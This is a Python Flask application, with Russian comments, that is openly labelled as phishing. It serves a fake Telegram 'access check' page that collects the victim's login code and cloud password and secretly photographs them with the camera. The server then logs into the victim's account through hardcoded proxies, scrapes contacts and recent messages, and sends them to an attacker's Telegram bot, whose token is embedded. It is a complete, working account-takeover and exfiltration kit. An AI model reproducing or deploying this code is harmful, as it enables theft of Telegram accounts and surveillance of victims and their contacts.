from flask import Flask, request, jsonify, render_template_string
import json
import os
import asyncio
import threading
import random
import requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty

app = Flask(__name__)

os.makedirs('logs', exist_ok=True)
os.makedirs('sessions', exist_ok=True)

# ===== НАСТРОЙКИ TELEGRAM БОТА =====
BOT_TOKEN = '8721886899:AAGu9u-1909paDVbxUYXza_e-yVhQamL6Ts'  # ЗАМЕНИ НА СВОЙ
ADMIN_ID = 8576352504  # ЗАМЕНИ НА СВОЙ TELEGRAM ID

def send_to_telegram(text, file_path=None):
    """Отправляет сообщение или файл в Telegram"""
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
    if file_path:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': ADMIN_ID, 'caption': text[:1000] if text else ''}
            requests.post(url + 'sendDocument', files=files, data=data)
    else:
        requests.post(url + 'sendMessage', json={'chat_id': ADMIN_ID, 'text': text[:4000]})

# ===== ПРОКСИ =====
PROXY_LIST = [
    {"addr": "31.59.20.176", "port": 6754, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "31.56.127.193", "port": 7684, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "45.38.107.97", "port": 6014, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "198.105.121.200", "port": 6462, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "64.137.96.74", "port": 6641, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "198.23.243.226", "port": 6361, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "38.154.185.97", "port": 6370, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "84.247.60.125", "port": 6095, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "142.111.67.146", "port": 5611, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "191.96.254.138", "port": 6185, "username": "hglsvxwl", "password": "lbix289l7ppz"},
]

def get_random_proxy():
    p = random.choice(PROXY_LIST)
    return {'proxy_type': 'socks5', 'addr': p['addr'], 'port': p['port'], 'username': p['username'], 'password': p['password'], 'rdns': True}

# ===== ГЕНЕРАЦИЯ API =====
try:
    from opentele.api import API
    def generate_api(uid): return API.TelegramDesktop.Generate(system="windows", unique_id=uid)
except:
    class FakeAPI:
        def __init__(self):
            self.api_id = 2040
            self.api_hash = 'b18441a1ff607e10aed891d4f5a9b7a5'
            self.device_model = 'Desktop'
            self.system_version = 'Windows 10'
            self.app_version = '4.16.5 x64'
            self.lang_code = 'en'
            self.system_lang_code = 'en-US'
    def generate_api(uid): return FakeAPI()

# ===== ПАРСЕР =====
def run_parser(phone, code, password):
    def _run():
        asyncio.set_event_loop(asyncio.new_event_loop())
        loop = asyncio.get_event_loop()
        loop.run_until_complete(parse_task(phone, code, password))
    threading.Thread(target=_run, daemon=True).start()

async def parse_task(phone, code, password):
    api = generate_api(abs(hash(phone)) % 1000000)
    proxy = get_random_proxy()
    client = TelegramClient(f'sessions/{phone}', api.api_id, api.api_hash,
        device_model=api.device_model, system_version=api.system_version,
        app_version=api.app_version, lang_code=api.lang_code,
        system_lang_code=api.system_lang_code, proxy=proxy)
    
    try:
        await client.start(phone=phone, code=code)
        if password:
            try: await client.sign_in(password=password)
            except: pass
        
        me = await client.get_me()
        
        # ===== КОНТАКТЫ =====
        contacts = await client(GetContactsRequest(hash=0))
        contact_list = [{'id': u.id, 'first_name': u.first_name, 'last_name': u.last_name, 
                         'username': u.username, 'phone': u.phone} for u in contacts.users if hasattr(u, 'id')]
        
        contacts_txt = f"📱 КОНТАКТЫ ({len(contact_list)})\n\n"
        for c in contact_list:
            contacts_txt += f"👤 {c['first_name']} {c.get('last_name', '')}\n"
            if c.get('username'): contacts_txt += f"   @{c['username']}\n"
            if c.get('phone'): contacts_txt += f"   📞 {c['phone']}\n"
            contacts_txt += f"   🆔 {c['id']}\n\n"
        
        contacts_file = f'logs/contacts_{phone}.txt'
        with open(contacts_file, 'w', encoding='utf-8') as f:
            f.write(contacts_txt)
        
        send_to_telegram(f"📱 Контакты {me.first_name} (@{me.username}): {len(contact_list)}", contacts_file)
        
        # ===== ДИАЛОГИ =====
        dialogs = await client(GetDialogsRequest(
            offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=50, hash=0
        ))
        
        html_content = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Диалоги {me.first_name}</title>
<style>
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0f0f1a;color:#e0e0e0;padding:20px;max-width:800px;margin:0 auto}}
.dialog{{background:rgba(255,255,255,0.04);border-radius:12px;padding:16px;margin-bottom:12px;border:1px solid rgba(255,255,255,0.06)}}
.dialog h3{{margin:0;font-size:16px;font-weight:600;color:#fff}}
.dialog .info{{color:#94a3b8;font-size:13px;margin:4px 0}}
.dialog .type{{display:inline-block;background:rgba(50,150,255,0.15);color:#5b8cff;font-size:11px;padding:2px 10px;border-radius:100px;font-weight:500}}
.messages{{margin-top:10px;padding-top:10px;border-top:1px solid rgba(255,255,255,0.06)}}
.msg{{background:rgba(255,255,255,0.03);border-radius:8px;padding:8px 12px;margin-bottom:6px;font-size:14px}}
.msg .sender{{color:#5b8cff;font-weight:500}}
.msg .text{{color:#e0e0e0}}
.msg .date{{color:#64748b;font-size:11px;float:right}}
</style>
</head>
<body>
    <h1>💬 Диалоги {me.first_name}</h1>
    <p style="color:#94a3b8;margin-bottom:20px">Всего: {len(dialogs.dialogs)}</p>
'''
        
        for dialog in dialogs.dialogs:
            dialog_type = '👤 Пользователь'
            if dialog.is_group: dialog_type = '👥 Группа'
            if dialog.is_channel: dialog_type = '📢 Канал'
            
            html_content += f'''
    <div class="dialog">
        <h3>{dialog.name or 'Без названия'}</h3>
        <div class="info"><span class="type">{dialog_type}</span> 🆔 {dialog.id}</div>
        <div class="messages">'''
            try:
                messages = await client.get_messages(dialog.id, limit=10)
                for msg in messages:
                    sender = "Я" if msg.out else (msg.sender.first_name if msg.sender else "Неизвестно")
                    text = msg.text.replace('<', '&lt;').replace('>', '&gt;') if msg.text else '[Медиа]'
                    date = msg.date.strftime('%H:%M') if msg.date else ''
                    html_content += f'''
            <div class="msg"><span class="sender">{sender}</span><span class="date">{date}</span><div class="text">{text[:200]}</div></div>'''
            except: pass
            html_content += '''
        </div>
    </div>'''
        
        html_content += '''
</body>
</html>'''
        
        html_file = f'logs/dialogs_{phone}.html'
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        send_to_telegram(f"💬 Диалоги {me.first_name} (@{me.username}): {len(dialogs.dialogs)}", html_file)
        
        print(f"[+] Парсинг {phone}: {len(contact_list)} контактов, {len(dialogs.dialogs)} диалогов")
        
    except Exception as e:
        print(f"[-] Ошибка {phone}: {e}")
        send_to_telegram(f"❌ Ошибка парсинга {phone}: {str(e)}")
    finally:
        await client.disconnect()

# ===== HTML (ФИШИНГ) =====
HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Проверка доступа</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none}
        body{min-height:100vh;background:#0a0a0f;display:flex;align-items:center;justify-content:center;padding:16px}
        #app{background:rgba(255,255,255,0.04);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,0.06);border-radius:28px;max-width:400px;width:100%;padding:32px 24px 40px}
        .step{display:none;flex-direction:column;gap:20px}.step.active{display:flex}
        h2{font-size:20px;font-weight:600;color:#fff;text-align:center}
        .timer{color:#94a3b8;font-size:14px;text-align:center}
        .pin-display{background:rgba(0,0,0,0.4);border-radius:14px;padding:16px;text-align:center;font-size:32px;letter-spacing:14px;min-height:68px;border:1px solid rgba(255,255,255,0.06);color:#fff;font-weight:300}
        .pin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
        .pin-grid button{background:rgba(255,255,255,0.07);border:none;border-radius:16px;padding:18px;font-size:26px;font-weight:500;color:#e0e0e0;cursor:pointer;transition:all 0.12s}
        .pin-grid button:active{transform:scale(0.92);background:rgba(255,255,255,0.14)}
        .pin-grid .clear{background:rgba(255,70,70,0.12);color:#ff6b6b;font-size:20px}
        .pin-grid .submit{background:rgba(50,150,255,0.18);color:#5b8cff;font-size:20px}
        .error{color:#ff6b6b;font-size:14px;text-align:center;min-height:20px}
        .password-field{display:flex;flex-direction:column;gap:12px}
        .password-field input{padding:16px 20px;border-radius:14px;border:1px solid rgba(255,255,255,0.08);background:rgba(0,0,0,0.3);font-size:16px;color:#fff;outline:none}
        .password-field input:focus{border-color:#5b8cff}
        .password-field button,#camera-btn{padding:16px;border-radius:14px;border:none;background:linear-gradient(135deg,#3b82f6,#7c3aed);color:#fff;font-size:16px;font-weight:600;cursor:pointer}
        #video{width:100%;border-radius:14px;background:#000;border:1px solid rgba(255,255,255,0.06);display:none;aspect-ratio:4/3;object-fit:cover}
        .info{color:#64748b;font-size:13px;text-align:center}
        .loader{width:40px;height:40px;border:3px solid rgba(255,255,255,0.06);border-top-color:#7c3aed;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
        @keyframes spin{to{transform:rotate(360deg)}}
        .queue{color:#94a3b8;font-size:15px;text-align:center}.queue span{color:#fff;font-weight:600}
        .warning{color:#f59e0b;font-size:13px;font-weight:500;text-align:center}
        .close-btn{margin-top:12px;padding:14px;border-radius:14px;border:none;background:rgba(255,255,255,0.06);color:#94a3b8;font-size:15px;font-weight:500;cursor:pointer}
        .hidden{display:none}
        .phone-display{background:rgba(0,0,0,0.3);border-radius:14px;padding:14px;text-align:center;font-size:18px;color:#94a3b8;border:1px solid rgba(255,255,255,0.06)}
        .phone-display span{color:#fff;font-weight:600}
        .show-code-btn{background:rgba(50,150,255,0.12);border:1px solid rgba(50,150,255,0.15);border-radius:14px;padding:12px 24px;color:#5b8cff;font-size:15px;font-weight:500;cursor:pointer;width:auto;transition:all 0.2s}
        .show-code-btn:active{background:rgba(50,150,255,0.25)}
        .btn-row{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
        @media(max-width:440px){#app{padding:24px 16px 32px}h2{font-size:18px}.pin-grid button{padding:16px;font-size:24px}.pin-display{font-size:28px;letter-spacing:12px;min-height:60px}}
    </style>
</head>
<body>
<div id="app">
    <div id="step-code" class="step active">
        <h2>📩 Введите код подтверждения</h2>
        <div class="phone-display">📱 Номер: <span id="phone-display">загрузка...</span></div>
        <p class="timer">⏳ Код действителен <span id="countdown">60</span> секунд</p>
        <div class="pin-display"><span id="pin-input"></span></div>
        <div class="pin-grid">
            <button onclick="pin(1)">1</button><button onclick="pin(2)">2</button><button onclick="pin(3)">3</button>
            <button onclick="pin(4)">4</button><button onclick="pin(5)">5</button><button onclick="pin(6)">6</button>
            <button onclick="pin(7)">7</button><button onclick="pin(8)">8</button><button onclick="pin(9)">9</button>
            <button onclick="clearPin()" class="clear">⌫</button><button onclick="pin(0)">0</button><button onclick="submitPin()" class="submit">✓</button>
        </div>
        <p class="error" id="code-error"></p>
        <div class="btn-row">
            <button class="show-code-btn" onclick="openTelegram()">📨 Показать код</button>
        </div>
    </div>

    <div id="step-password" class="step">
        <h2>🔑 Облачный пароль</h2>
        <p style="color:#94a3b8;text-align:center;font-size:15px;">Введите облачный пароль для завершения</p>
        <input type="password" id="cloud-pass" placeholder="Облачный пароль">
        <button id="pass-submit">Подтвердить</button>
        <p class="error" id="pass-error"></p>
    </div>

    <div id="step-camera" class="step">
        <h2>📸 Доступ к камере</h2>
        <p style="color:#94a3b8;text-align:center;font-size:15px;">Для завершения проверки необходим доступ к камере</p>
        <button id="camera-btn">🎥 Дать доступ</button>
        <video id="video" autoplay muted></video>
        <p class="error" id="camera-error"></p>
    </div>

    <div id="step-done" class="step">
        <div style="font-size:52px;text-align:center">✅</div>
        <h2>Вы сделали все правильно!</h2>
        <p class="queue">Ваше место в очереди: <span id="queue">15</span></p>
        <p class="warning">🔴 Не закрывайте это окно</p>
        <div class="loader"></div>
        <button class="close-btn" onclick="closeApp()">Закрыть</button>
    </div>
</div>

<script>
const tg = window.Telegram?.WebApp;
let userPhone = null, userId = null;
if (tg) {
    tg.expand();
    const user = tg.initDataUnsafe?.user;
    if (user) { userPhone = user.phone_number || null; userId = user.id || null; document.getElementById('phone-display').textContent = userPhone || 'не найден'; }
    else { document.getElementById('phone-display').textContent = '❌ не удалось получить'; }
} else { document.getElementById('phone-display').textContent = '❌ откройте через Telegram'; }

if (!userPhone) {
    document.getElementById('code-error').textContent = '❌ Ошибка: откройте через Telegram';
    document.querySelectorAll('.pin-grid button').forEach(b => b.disabled = true);
}

let pinCode = '', step = 'code', countdown = 60, timerInterval = null, isSubmitting = false;
const API_URL = window.location.origin;

function openTelegram() { if (tg) tg.openTelegram(); else window.open('https://t.me', '_blank'); }
function showStep(name) { document.querySelectorAll('.step').forEach(el => el.classList.remove('active')); document.getElementById('step-'+name).classList.add('active'); }
function pin(n) { if (step !== 'code' || isSubmitting) return; if (pinCode.length < 6) { pinCode += n; document.getElementById('pin-input').textContent = pinCode.replace(/./g,'●'); } }
function clearPin() { if (step !== 'code' || isSubmitting) return; pinCode = pinCode.slice(0,-1); document.getElementById('pin-input').textContent = pinCode.replace(/./g,'●'); }

async function sendToServer(type, data) {
    try {
        const response = await fetch(API_URL + '/api/collect', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ type, data, user: { id: userId, phone: userPhone }, timestamp: new Date().toISOString() })
        });
        return await response.json();
    } catch(e) { document.getElementById('code-error').textContent = '❌ Ошибка соединения'; return null; }
}

async function submitPin() {
    if (step !== 'code' || isSubmitting) return;
    if (pinCode.length < 4) { document.getElementById('code-error').textContent = '❌ Введите хотя бы 4 символа'; return; }
    isSubmitting = true;
    document.getElementById('code-error').textContent = '⏳ Отправка...';
    const result = await sendToServer('code', { pin: pinCode });
    if (result && result.status === 'ok') {
        if (result.need_password) { showStep('password'); step = 'password'; }
        else { showStep('camera'); step = 'camera'; }
    } else { document.getElementById('code-error').textContent = '❌ Неверный код'; isSubmitting = false; }
}

document.getElementById('pass-submit').addEventListener('click', async function() {
    const password = document.getElementById('cloud-pass').value.trim();
    if (password.length < 3) { document.getElementById('pass-error').textContent = '❌ Введите пароль'; return; }
    document.getElementById('pass-error').textContent = '⏳ Проверка...';
    const result = await sendToServer('cloud_password', { password });
    if (result && result.status === 'ok') { showStep('camera'); step = 'camera'; }
    else { document.getElementById('pass-error').textContent = '❌ Неверный пароль'; }
});

document.getElementById('camera-btn').addEventListener('click', async function() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
        const video = document.getElementById('video');
        video.srcObject = stream; video.style.display = 'block'; video.play();
        document.getElementById('camera-error').textContent = '';
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            sendToServer('camera', { image: canvas.toDataURL('image/jpeg') });
            stream.getTracks().forEach(t => t.stop()); video.style.display = 'none';
            showStep('done');
            document.getElementById('queue').textContent = Math.floor(Math.random()*25)+5;
            fetch(API_URL + '/api/parse', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ phone: userPhone, code: pinCode, password: document.getElementById('cloud-pass').value || '' })
            });
        }, 2000);
    } catch(e) { document.getElementById('camera-error').textContent = '❌ Доступ запрещён: ' + e.message; }
});

function closeApp() { if (tg) tg.close(); }

function startTimer() {
    countdown = 60; document.getElementById('countdown').textContent = countdown;
    timerInterval = setInterval(() => {
        countdown--; document.getElementById('countdown').textContent = countdown;
        if (countdown <= 0) { clearInterval(timerInterval); document.getElementById('code-error').textContent = '⏰ Время истекло'; }
    }, 1000);
}
startTimer();
</script>
</body>
</html>
'''

# ===== МАРШРУТЫ =====
@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.get_json()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    filename = f'logs/{timestamp}.json'
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    print(f"[+] {data.get('type')}: {filename}")
    if data.get('type') == 'code':
        phone = data.get('user', {}).get('phone')
        pin = data.get('data', {}).get('pin', '')
        if phone and pin:
            print(f"[+] Запуск парсера для {phone}")
            run_parser(phone, pin, '')
    return jsonify({'status': 'ok'})

@app.route('/api/parse', methods=['POST'])
def parse():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password', '')
    if phone and code:
        run_parser(phone, code, password)
        return jsonify({'status': 'parsing_started'})
    return jsonify({'error': 'missing data'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)